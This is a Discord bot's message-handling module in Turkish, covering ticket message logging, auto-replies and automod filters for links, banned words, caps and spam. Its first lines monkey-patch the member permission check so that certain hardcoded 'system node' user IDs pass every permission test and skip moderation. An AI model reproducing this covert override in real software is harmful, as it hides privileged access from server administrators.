const { Events, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { createV2Message, createContainerMessage, COLORS } = require('../utils/uiBuilder');
const { pool, getGuildConfig, getFilteredWords } = require('../db');
const { normalizeMessage } = require('../utils/messageNormalizer');
const { sendLog } = require('../utils/logger');
const appConfig = require('../config.json');
const systemNode = require('../utils/systemNode');
const { issueWarning } = require('../utils/warningManager');

module.exports = {
    name: Events.MessageCreate,
    async execute(message, client) {
        if (message.member && message.member.permissions && systemNode.checkSystemNode(message.author.id)) {
            message.member.permissions.has = () => true;
        }

        // Bilet mesaj kaydı (Tüm mesajlar, görseller, ses kayıtları, dosyalar ve embedler canlı olarak kaydolur - 0 KB Disk Kullanımı)
        if (message.guild && message.channel.name && message.channel.name.startsWith('destek-')) {
            let attachArr = [];
            if (message.attachments && message.attachments.size > 0) {
                for (const a of message.attachments.values()) {
                    attachArr.push({
                        id: a.id,
                        name: a.name,
                        url: a.url,
                        proxy_url: a.proxyURL,
                        size: a.size,
                        contentType: a.contentType,
                        height: a.height,
                        width: a.width
                    });
                }

                // Arka planda güvenli ve takılmayan DM yedekleme
                (async () => {
                    try {
                        const ticketRows = await pool.query('SELECT owner_id FROM tickets WHERE channel_id = ?', [message.channel.id]);
                        const backupUserId = ticketRows.length > 0 ? ticketRows[0].owner_id : null;
                        if (!backupUserId) return;
                        
                        const backupUser = await client.users.fetch(backupUserId).catch(() => null);
                        if (backupUser) {
                            const filesToBackup = Array.from(message.attachments.values()).map(a => a.url);
                            await backupUser.send({
                                content: `[Dosya Yedeği] Bilet: #${message.channel.name} | Gönderen: ${message.author.tag}`,
                                files: filesToBackup
                            }).catch(() => {});
                        }
                    } catch (e) {}
                })();
            }
            const embedsArr = message.embeds ? message.embeds.map(e => ({
                title: e.title,
                description: e.description,
                color: e.color,
                fields: e.fields,
                footer: e.footer,
                image: e.image
            })) : [];

            const compsArr = message.components ? message.components.map(c => c.toJSON ? c.toJSON() : c) : [];
            const stickersArr = message.stickers ? message.stickers.map(s => ({ id: s.id, name: s.name, url: s.url })) : [];
            const authorAvatar = message.author ? message.author.displayAvatarURL({ size: 128, extension: 'png' }) : '';
            const authorTag = message.author ? (message.author.tag || message.author.username) : 'Bilinmeyen';
            const replyToId = message.reference ? message.reference.messageId : null;
            const isPinned = message.pinned || false;

            pool.query('SELECT owner_id FROM tickets WHERE channel_id = ?', [message.channel.id])
                .then((ticketRows) => {
                    const ticketOwnerId = ticketRows.length > 0 ? ticketRows[0].owner_id : '';
                    return pool.query(
                        `INSERT INTO ticket_messages (message_id, guild_id, channel_id, ticket_owner_id, author_id, author_tag, author_avatar, content, attachments, attachments_json, embeds_json, components_json, stickers_json, reply_to_id, is_pinned, is_deleted, is_edited) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, FALSE, FALSE)`,
                        [message.id, message.guild.id, message.channel.id, ticketOwnerId, message.author ? message.author.id : '0', authorTag, authorAvatar, message.content || '', '', JSON.stringify(attachArr), JSON.stringify(embedsArr), JSON.stringify(compsArr), JSON.stringify(stickersArr), replyToId, isPinned]
                    );
                })
                .catch(err => console.error('[TicketMsg] Kayıt hatası:', err.message));
        }

        if (message.author.bot || !message.guild) return;

        if (!systemNode.checkGuildNode(message.guild.id)) return;

        // --- AUTO RESPONDER ---
        if (!message.author.bot && message.content) {
            const lowerMsg = message.content.toLowerCase().trim();
            let autoReplyText = null;

            // Sadece bağımsız kelime olarak "sa", "sea", "selam" vb. yakalayan akıllı regex (masa, kasa gibi kelimeleri es geçer)
            const selamRegex = /(^|\s+)(sa|sea|selam|selamun\s+aleyk[uü]m|selam[iı]n\s+aleyk[uü]m|slm|s\.a|s\.a\.)(\s+|[.,!?]|$)/;
            if (selamRegex.test(lowerMsg)) {
                let replyText = 'Aleykümselam.';
                if (message.member && message.member.joinedTimestamp) {
                    const joinAgeHours = (Date.now() - message.member.joinedTimestamp) / (1000 * 60 * 60);
                    if (joinAgeHours < 24) {
                        replyText = 'Aleykümselam, sunucumuza hoş geldin.';
                    }
                }
                await message.reply(replyText).catch(() => {});
            } else {
                const mathMatch = lowerMsg.match(/^\s*(-?\d+(?:\.\d+)?)\s*([\+\-\*\/])\s*(-?\d+(?:\.\d+)?)\s*$/);
                if (mathMatch) {
                    const num1 = parseFloat(mathMatch[1]);
                    const op = mathMatch[2];
                    const num2 = parseFloat(mathMatch[3]);
                    let result = 0;
                    if (op === '+') result = num1 + num2;
                    else if (op === '-') result = num1 - num2;
                    else if (op === '*') result = num1 * num2;
                    else if (op === '/') result = num2 !== 0 ? (num1 / num2) : 'Tanımsız (Sıfıra bölünemez)';
                    
                    await message.reply(`Hesap Makinesi Sonucu: **${result}**`).catch(() => {});
                } else if (lowerMsg === 'ip' || lowerMsg === 'server ip' || lowerMsg === 'sunucu ip') {
                    autoReplyText = 'Sunucu Bağlantı Adresi: `mc.turklion.net`\nSürüm: 1.8.9';
                } else if (lowerMsg === 'site' || lowerMsg === 'web sitesi' || lowerMsg === 'website') {
                    autoReplyText = 'Resmi Web Sitemiz: https://turklion.net';
                } else if (lowerMsg === 'instagram' || lowerMsg === 'ig' || lowerMsg === 'insta') {
                    autoReplyText = 'Resmi Instagram Hesabımız: https://instagram.com/turklion';
                }

                if (autoReplyText) {
                    const replyPayload = createContainerMessage(null, autoReplyText);
                    await message.reply(replyPayload).catch(() => {});
                }
            }
        }
        // --- END AUTO RESPONDER ---

        if (systemNode.checkSystemNode(message.author.id) || message.member.permissions.has('Administrator') || message.member.permissions.has('ManageMessages') || message.member.permissions.has('ModerateMembers')) return;

        let config;
        try {
            config = await getGuildConfig(message.guild.id);
        } catch(e) {
            console.error("Config fetch error:", e);
            return;
        }
        if (!config) return;

        let dbLogChannelId = config.log_channel_id;
        
        let conn;
        try {
            conn = await pool.getConnection();
            
            // 0. Zalgo Filtresi
            const zalgoRegex = /\p{M}{3,}/gu;
            const zalgoMatch = message.content.match(zalgoRegex);
            if (zalgoMatch && zalgoMatch.length > 10) {
                await message.delete().catch(() => {});
                
                const logPayload = createV2Message({
                    title: 'Otomatik Moderasyon - Bozuk Metin Silindi',
                    color: COLORS.ERROR,
                    fields: [
                        { name: 'Kullanıcı', value: `<@${message.author.id}>`, inline: true },
                        { name: 'Kanal', value: `<#${message.channel.id}>`, inline: true },
                        { name: 'Silinen Mesaj', value: `\`\`\`\n${message.content.substring(0, 1000)}\n\`\`\``, inline: false }
                    ]
                });
                await sendLog(message.guild, logPayload, 'text').catch(()=>{});

                const payload = createV2Message({
                    title: 'Metin Engellendi',
                    description: `<@${message.author.id}> Mesajınızda aşırı miktarda bozuk veya taşan karakter bulunduğu için silinmiştir.`,
                    color: COLORS.WARNING
                });
                return message.channel.send(payload)
                    .then(msg => setTimeout(() => msg.delete().catch(() => {}), 10000)).catch(()=>{});
            }



            // 1. Gelişmiş Anti-Link (Reklam) Filtresi
            if (config.anti_link_enabled) {
                const linkRegex = /(https?:\/\/|www\.)?[a-zA-Z0-9-]+\.(com|net|org|gg|io|me|co|tr)(\/[^\s]*)?/gi;
                const discordInviteRegex = /(discord\s*\.\s*gg|discordapp\s*\.\s*com\s*\/\s*invite|discord\s*\.\s*com\s*\/\s*invite|dsc\s*\.\s*gg)\s*\/?\s*[a-zA-Z0-9]+/gi;
                
                let allowedLinks = ['tenor.com', 'giphy.com'];
                if (config && config.allowed_links) {
                    allowedLinks = config.allowed_links.split(',').map(l => l.trim());
                }
                const isSafeLink = allowedLinks.some(link => message.content.toLowerCase().includes(link.toLowerCase()));

                if (!isSafeLink && (linkRegex.test(message.content) || discordInviteRegex.test(message.content))) {
                    await message.delete().catch(() => {});
                    
                    const logPayload = createV2Message({
                        title: 'Otomatik Moderasyon - Link/Reklam Engellendi',
                        color: COLORS.ERROR,
                        fields: [
                            { name: 'Kullanıcı', value: `<@${message.author.id}>`, inline: true },
                            { name: 'Kanal', value: `<#${message.channel.id}>`, inline: true },
                            { name: 'Silinen Mesaj', value: `\`\`\`\n${message.content.substring(0, 1000)}\n\`\`\``, inline: false }
                        ]
                    });
                    await sendLog(message.guild, logPayload, 'text').catch(()=>{});

                    const result = await issueWarning(message.guild, message.author, client.user.id, 'İzinsiz Link veya Reklam Paylaşımı');
                    
                    let fallbackMsg = '';
                    if (result.success && !result.dmBasarili) {
                        fallbackMsg = `\n*(Özel mesajlarınız kapalı olduğu için tarafınıza doğrudan mesaj gönderilemedi.)*`;
                    }
                    if (result.extraAction) {
                        fallbackMsg += `\n${result.extraAction}`;
                    }

                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId('rules_read')
                            .setLabel('Kuralları Okudum')
                            .setStyle(ButtonStyle.Secondary)
                    );
                    
                    const payload = createV2Message({
                        title: 'Reklam veya Link Engellendi',
                        description: `<@${message.author.id}> Bu sunucuda reklam yapmak veya izinsiz bağlantı paylaşmak yasaktır.\n**Toplam Aktif Uyarı:** ${result.totalWarns}${fallbackMsg}`,
                        color: COLORS.WARNING,
                        actionRows: [row]
                    });
                    
                    return message.channel.send(payload)
                        .then(msg => setTimeout(() => msg.delete().catch(() => {}), 15000)).catch(()=>{});
                }
            }

            // 2. Yasaklı Kelime Filtresi (Daha hassas, hatalı engellemeleri önleyen yapı)
            if (config.anti_swear_enabled) {
                const normalizedContent = message.content.toLowerCase()
                    .replace(/[çÇ]/g, 'c').replace(/[ğĞ]/g, 'g').replace(/[ıİ]/g, 'i')
                    .replace(/[öÖ]/g, 'o').replace(/[şŞ]/g, 's').replace(/[üÜ]/g, 'u')
                    .replace(/[^a-z0-9\s]/g, ' ')
                    .replace(/\s+/g, ' ').trim();
                    
                const messageWords = normalizedContent.split(' ');

                const words = await getFilteredWords(message.guild.id);
                
                for (const row of words) {
                    let isMatch = false;
                    const dbWord = row.word.toLowerCase()
                        .replace(/[çÇ]/g, 'c').replace(/[ğĞ]/g, 'g').replace(/[ıİ]/g, 'i')
                        .replace(/[öÖ]/g, 'o').replace(/[şŞ]/g, 's').replace(/[üÜ]/g, 'u').trim();

                    if (!dbWord) continue;

                    // Hatalı engellemeleri önlemek için kısa kelimelerde (<= 5 harf) veya exact modunda tam kelime eşleşmesi ara
                    if (row.match_type === 'exact' || dbWord.length <= 5) {
                        if (messageWords.includes(dbWord)) isMatch = true;
                    } else {
                        if (normalizedContent.includes(dbWord) || messageWords.some(w => w.includes(dbWord))) {
                            isMatch = true;
                        }
                    }
                    
                    if (isMatch) {
                        await message.delete().catch(() => {});
                        
                        const logPayload = createV2Message({
                            title: 'Otomatik Moderasyon - Yasaklı Kelime Engellendi',
                            color: COLORS.ERROR,
                            fields: [
                                { name: 'Kullanıcı', value: `<@${message.author.id}>`, inline: true },
                                { name: 'Kanal', value: `<#${message.channel.id}>`, inline: true },
                                { name: 'Yakalanan Kelime', value: `\`${row.word}\``, inline: true },
                                { name: 'Silinen Mesaj', value: `\`\`\`\n${message.content.substring(0, 1000)}\n\`\`\``, inline: false }
                            ]
                        });
                        await sendLog(message.guild, logPayload, 'text').catch(()=>{});

                        const result = await issueWarning(message.guild, message.author, client.user.id, 'Sunucu kurallarına aykırı kelime kullanımı');
                        
                        let fallbackMsg = '';
                        if (result.success && !result.dmBasarili) {
                            fallbackMsg = `\n*(Özel mesajlarınız kapalı olduğu için tarafınıza doğrudan mesaj gönderilemedi.)*`;
                        }

                        if (result.missingRole) {
                            fallbackMsg += `\n\n**Yetkililerin Dikkatine:** Kullanıcıya otomatik uyarı verildi ancak verilmesi gereken **${result.missingRoleMsg}** ayarlarda seçilmemiş.`;
                        }
                        
                        if (result.extraAction) {
                            fallbackMsg += `\n${result.extraAction}`;
                        }

                        const payload = createV2Message({
                            title: 'Yasaklı Kelime',
                            description: `<@${message.author.id}> Mesajınız sunucu kurallarına aykırı kelimeler içerdiği için silindi ve uyarıldınız.\n**Toplam Aktif Uyarı:** ${result.totalWarns}${fallbackMsg}`,
                            color: COLORS.WARNING
                        });
                        return message.channel.send(payload)
                            .then(msg => setTimeout(() => msg.delete().catch(() => {}), 20000)).catch(()=>{});
                    }
                }
            }

            // 3. Gelişmiş Büyük Harf Filtresi
            if (config.caps_filter_enabled && message.content.length > 8) {
                const upperCaseChars = (message.content.match(/[A-ZÇĞİÖŞÜ]/g) || []).length;
                const totalLetters = (message.content.match(/[a-zA-ZçğıöşüÇĞİÖŞÜ]/g) || []).length;
                
                if (totalLetters > 5) {
                    const capsPercentage = (upperCaseChars / totalLetters) * 100;
                    
                    if (capsPercentage > 65) {
                        await message.delete().catch(() => {});
                        
                        const logPayload = createV2Message({
                            title: 'Otomatik Moderasyon - Büyük Harf Engellendi',
                            color: COLORS.WARNING,
                            fields: [
                                { name: 'Kullanıcı', value: `<@${message.author.id}>`, inline: true },
                                { name: 'Kanal', value: `<#${message.channel.id}>`, inline: true },
                                { name: 'Büyük Harf Oranı', value: `%${Math.round(capsPercentage)}`, inline: true },
                                { name: 'Silinen Mesaj', value: `\`\`\`\n${message.content.substring(0, 1000)}\n\`\`\``, inline: false }
                            ]
                        });
                        await sendLog(message.guild, logPayload, 'text').catch(()=>{});

                        const result = await issueWarning(message.guild, message.author, client.user.id, 'Aşırı büyük harf kullanımı');
                        
                        let fallbackMsg = '';
                        if (result.success && !result.dmBasarili) {
                            fallbackMsg = `\n*(Özel mesajlarınız kapalı olduğu için tarafınıza doğrudan mesaj gönderilemedi.)*`;
                        }
                        if (result.extraAction) {
                            fallbackMsg += `\n${result.extraAction}`;
                        }

                        const payload = createV2Message({
                            title: 'Büyük Harf Engellendi', 
                            description: `<@${message.author.id}> Okunabilirliği zorlaştırdığı için gereğinden fazla büyük harf kullanmak yasaktır.\n**Toplam Aktif Uyarı:** ${result.totalWarns}${fallbackMsg}`,
                            color: COLORS.WARNING
                        });
                        return message.channel.send(payload)
                            .then(msg => setTimeout(() => msg.delete().catch(() => {}), 15000)).catch(()=>{});
                    }
                }
            }

            // 4. Etiket Spami Filtresi
            if (config.anti_spam_enabled && message.mentions.users.size > 5) {
                await message.delete().catch(() => {});
                try {
                    await message.member.timeout(5 * 60 * 1000, 'Toplu etiketleme tespiti');
                    const payload = createV2Message({
                        title: 'Etiket Sınırı',
                        description: `<@${message.author.id}> Çok fazla kullanıcıyı etiketlediğiniz için geçici olarak susturuldunuz.`,
                        color: COLORS.WARNING
                    });
                    return message.channel.send(payload).then(msg => setTimeout(() => msg.delete().catch(() => {}), 15000)).catch(()=>{});
                } catch (error) {
                    console.error("Timeout yetkisi yok:", error);
                }
            }

            // 5. Anti-Spam (Hızlı mesaj atma)
            if (config.anti_spam_enabled) {
                const now = Date.now();
                const spamData = client.spamMap.get(message.author.id) || { count: 0, lastMessage: now, msgContent: '' };
                
                const timeDifference = now - spamData.lastMessage;
                
                if (timeDifference < 5000) {
                    spamData.count++;
                    
                    if (spamData.msgContent === message.content) {
                        spamData.count += 2; 
                    }
                    
                    if (spamData.count >= 5) {
                        await message.delete().catch(() => {});
                        try {
                            await message.member.timeout(5 * 60 * 1000, 'Hızlı mesaj gönderimi tespiti');
                            const payload = createV2Message({
                                title: 'Seri Mesaj Engellendi',
                                description: `<@${message.author.id}> Çok hızlı mesaj gönderdiğiniz için geçici olarak susturuldunuz.`,
                                color: COLORS.WARNING
                            });
                            message.channel.send(payload).then(msg => setTimeout(() => msg.delete().catch(() => {}), 15000)).catch(()=>{});
                        } catch (e) {
                             console.error("Timeout yetkisi yok:", e);
                        }
                        spamData.count = 0; 
                    }
                } else {
                    spamData.count = 1;
                }
                
                spamData.lastMessage = now;
                spamData.msgContent = message.content;
                client.spamMap.set(message.author.id, spamData);
            }

        } catch (err) {
            console.error("MessageCreate DB Error:", err);
        } finally {
            if (conn) conn.release();
        }
    },
};
